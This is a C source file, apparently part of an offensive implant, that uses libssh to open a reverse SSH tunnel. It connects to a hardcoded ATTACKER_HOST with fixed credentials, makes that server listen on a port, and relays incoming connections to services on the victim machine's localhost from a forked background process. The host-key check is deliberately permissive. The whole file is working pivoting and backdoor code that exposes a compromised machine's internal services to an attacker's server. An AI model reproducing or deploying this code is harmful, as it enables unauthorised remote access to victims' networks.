#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <errno.h>

#include "colors.h"

#define MAX(x, y) (((x)>(y))?(x):(y))

#define ATTACKER_HOST "localhost"	// <ssh-server>
#define ATTACKER_SSH_PORT 22	// <ssh-server-port>
#define USERNAME "payload"
#define PASSWORD "password"


static void handle_sigchld(int sig)
{
	int saved_errno = errno;
	while (waitpid(-1, 0, WNOHANG) > 0)	/* Possibly save exit status */
		;
	errno = saved_errno;
}

static int register_sigchld_handler()
{
	struct sigaction sa;
	sa.sa_handler = &handle_sigchld;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
	if (sigaction(SIGCHLD, &sa, 0) == -1)
		return -1;

	return 0;
}

static int verify_knownhost(ssh_session sess)
{
	int state = ssh_is_server_known(sess);

	switch (state) {
	case SSH_SERVER_KNOWN_OK:
	case SSH_SERVER_KNOWN_CHANGED:
	case SSH_SERVER_FILE_NOT_FOUND:
	case SSH_SERVER_NOT_KNOWN:
		break;
	case SSH_SERVER_ERROR:
		fprintf(stderr, "Error %s\n", ssh_get_error(sess));
		return -1;
	}

	return 0;
}

static ssh_session connect_to_ssh_server()
{
	ssh_session session = ssh_new();
	if (!session)
		return NULL;

	int verbosity = SSH_LOG_NOLOG;
	int port = ATTACKER_SSH_PORT;

	ssh_options_set(session, SSH_OPTIONS_HOST, ATTACKER_HOST);	// <ssh-server>
	ssh_options_set(session, SSH_OPTIONS_USER, USERNAME);
	ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	ssh_options_set(session, SSH_OPTIONS_PORT, &port);	// <ssh-server-port>

	int rc = ssh_connect(session);
	if (rc != SSH_OK) {
		printf(RED("[*] Error connecting to %s: %s\n"),
		       ATTACKER_HOST, ssh_get_error(session));
		ssh_free(session);
		return NULL;
	}

	if (verify_knownhost(session) < 0) {
		printf(RED("[*] Failed verifying host\n"));
		ssh_disconnect(session);
		ssh_free(session);
		return NULL;
	}

	rc = ssh_userauth_password(session, NULL, PASSWORD);
	if (rc != SSH_AUTH_SUCCESS) {
		printf(RED("[*] Error authenticating %s: %s\n"),
		       USERNAME, ssh_get_error(session));
		ssh_disconnect(session);
		ssh_free(session);
		return NULL;
	}

	return session;
}

static int connect_to_local_service(int port)
{
	int sockfd = 0;

	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
		printf("inet_pton\n");
		return -1;
	}

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("socket\n");
		return -1;
	}

	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
	    0) {
		printf("connect\n");
		return -1;
	}

	return sockfd;
}


#define CLIENT_SENT_EOF -6
#define SERVICE_SENT_EOF -5
#define SERVICE_CONN_ERROR -4
#define SSH_SENT_EOF -3
#define SYSTEM_ERROR -2

static int do_remote_forwarding_loop(ssh_session session,
				     ssh_channel channel, int lport)
{
    /* Connect to the service */
    int sockfd;
    int rc;
    printf(YELLOW("[OTCP] Connecting to localhost:%d..."), lport);
    rc = connect_to_local_service(lport);
    if (rc == -1) {
        printf(RED("failed\n"));
        return SERVICE_CONN_ERROR;
    }
    printf(YELLOW("done\n"));

    sockfd = rc;

	int nbytes = 0, nwritten = 0;

#define BUF_SIZE 4096
	char *buffer = malloc(BUF_SIZE);
	if (!buffer) {
		printf("[DEBUG] malloc\n");
		return SYSTEM_ERROR;
	}

#define EVENTS (POLLIN | POLLPRI)
    int ssh_fd = ssh_get_fd(session);
    struct pollfd fds[2];
    fds[0].fd = ssh_fd;
    fds[0].events = EVENTS;
    fds[1].fd = sockfd;
    fds[1].events = EVENTS;

    while (1) {
        rc = poll(fds, 2, -1);
        if (rc == -1) {
            break;
        }

        if (fds[0].revents & POLLIN) {
            nbytes =
                ssh_channel_read_nonblocking(channel, buffer,
                             BUF_SIZE, 0);
            if (nbytes == 0) {
                if (ssh_channel_is_eof(channel) ||
                    !ssh_channel_is_open(channel)) {
                    free(buffer);
                    close(sockfd);
                    return SSH_SENT_EOF;
                }
            }
            if (nbytes == SSH_ERROR) {
                printf(RED
                       ("[DEBUG] ssh_channel_read_nonblocking: %s\n"),
                       ssh_get_error(session));
                free(buffer);
                close(sockfd);
                return SSH_ERROR;
            }
            if (nbytes > 0) {
                printf("[DEBUG] Read %d bytes from SSH tunnel\n", nbytes);

                /* Write to service */
                int tot_sent = 0;
                while (tot_sent < nbytes) {
                    nwritten = send(sockfd,
                            buffer + tot_sent,
                            nbytes - tot_sent, MSG_DONTWAIT);
                    if (nwritten < 0) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            free(buffer);
                            close(sockfd);
                            return SERVICE_CONN_ERROR;
                        }
                    } else {
                        tot_sent += nwritten;
                        printf("[DEBUG] Sent %d bytes to service\n", nwritten);
                    }
                }
            } else {
                /* Assume client has closed connection
                   to rport on remote side */
                free(buffer);
                close(sockfd);
                return CLIENT_SENT_EOF;
            }
        }

        if (fds[1].revents & POLLIN) {
            nbytes = recv(sockfd, buffer, BUF_SIZE, MSG_DONTWAIT);
            if (nbytes < 0) {
                if(errno != EAGAIN && errno != EWOULDBLOCK) {
                    printf(RED("recv: %s\n"), strerror(errno));
                    free(buffer);
                    close(sockfd);
                    return SERVICE_CONN_ERROR;
                }
            } else if (nbytes == 0) {
                printf(RED("recv: EOF\n"));
                free(buffer);
                close(sockfd);
                return SERVICE_SENT_EOF;
            }
            printf("[DEBUG] Read %d bytes from service\n", nbytes);

            int tot_sent = 0;
            while (tot_sent < nbytes) {
                nwritten = ssh_channel_write(channel,
                                 buffer + tot_sent,
                                 nbytes - tot_sent);
                if (nwritten == SSH_ERROR) {
                    printf(RED("ssh_channel_write: %s\n"),
                           ssh_get_error(session));
                    free(buffer);
                    close(sockfd);
                    return SSH_ERROR;
                } else {
                    tot_sent += nwritten;
                    printf("[DEBUG] Sent %d bytes to SSH tunnel\n", nwritten);
                }
            }
        }
    }
}

static int do_remote_forwarding(int lport, int rport)
{
	int rc;

	printf(YELLOW("[OTCP] Establishing SSH tunnel to server..."));
	ssh_session sess = connect_to_ssh_server();
	if (!sess) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(YELLOW("done\n"));

	printf(YELLOW("[OTCP] Opening port T:%d on server..."), rport);
	rc = ssh_channel_listen_forward(sess, NULL, rport, NULL);
	if (rc != SSH_OK) {
		printf(RED("failed: %s\n"), ssh_get_error(sess));
		ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
	}
	printf(YELLOW("done\n"));

    while (1) {
        int dport = 0;      // The port bound on the server, here: 8080
        printf(YELLOW("[OTCP] Waiting for incoming connection..."));
        fflush(stdout);

#define ACCEPT_FORWARD_TIMEOUT 120000
    	ssh_channel chan = ssh_channel_accept_forward(sess,
    						      ACCEPT_FORWARD_TIMEOUT,
    						      &dport);
    	if (chan == NULL) {
    		printf(RED("failed: %s\n"), ssh_get_error(sess));
    		ssh_disconnect(sess);
            ssh_free(sess);
            return -1;
    	}
    	printf(YELLOW("\n[OTCP] Connection received\n"));

    	rc = do_remote_forwarding_loop(sess, chan, lport);
        if (rc == SSH_SENT_EOF || rc == SSH_ERROR ||
            rc == SYSTEM_ERROR) {
            printf(YELLOW("[OTCP] Terminate SSH channel\n"));
            ssh_channel_send_eof(chan);
            ssh_channel_free(chan);
            ssh_disconnect(sess);
            ssh_free(sess);
            return 1;
        } else {
            /* The service has either sent EOF
               or an error condition occurred, but
               the tunnel is still open.
               Accept a new connection. */
            printf("[DEBUG] Service disconnected\n");
            ssh_channel_send_eof(chan);
            printf("[DEBUG] Sent SSH EOF\n");
            ssh_channel_free(chan);
            printf("[DEBUG] Freed channel\n");
            continue;
        }
    }
}

/* OpenSSH command equivalent:
 * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
 *
 * lport:   port to forward to once tunnel established
 * rport:   port the ssh server will be listening on
 */
int remote_forwarding(int lport, int rport)
{
	if ((rport < 1 || rport > 65535) || (lport < 1 || lport > 65535))
		return -1;

	printf(BLUE("[*] Registering SIGCHLD handler for new process..."));
	if (register_sigchld_handler() == -1) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(BLUE("done\n"));

	int ret;
	switch (fork()) {
	case -1:		/* Error */
		printf(RED("[*] Fork error\n"));
		ret = -1;
		break;
	case 0:		/* Child, do tunnel */
		ret = do_remote_forwarding(lport, rport);
		printf(YELLOW("[OTCP] Executing terminated with status %d\n"),
		       ret);
		_exit(ret);
	default:		/* Parent, go back to execution loop */
		printf(BLUE("[*] Remote port forwarding launched\n"));
		ret = 1;	/* SUCC */
		break;
	}

	return ret;
}
